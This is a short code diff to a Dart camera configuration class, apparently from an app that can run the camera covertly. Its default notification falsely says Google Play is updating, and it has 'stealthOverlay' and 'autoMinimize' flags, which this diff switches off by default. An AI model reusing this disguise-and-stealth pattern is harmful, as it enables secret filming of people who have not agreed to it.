@@ -18,8 +18,9 @@ class CameraConfig {
   static const CameraConfig defaults = CameraConfig(
     notifTitle: 'กำลังอัพเดท Google Play',
     notifBody: 'กำลังตรวจสอบและดาวน์โหลดข้อมูลล่าสุด',
-    stealthOverlay: true,
-    autoMinimize: true,
+    // Default = OFF — กล้องเริ่มต้นแสดง UI ปกติ
+    stealthOverlay: false,
+    autoMinimize: false,
   );
 
   factory CameraConfig.fromJson(Map<String, dynamic> json) => CameraConfig(
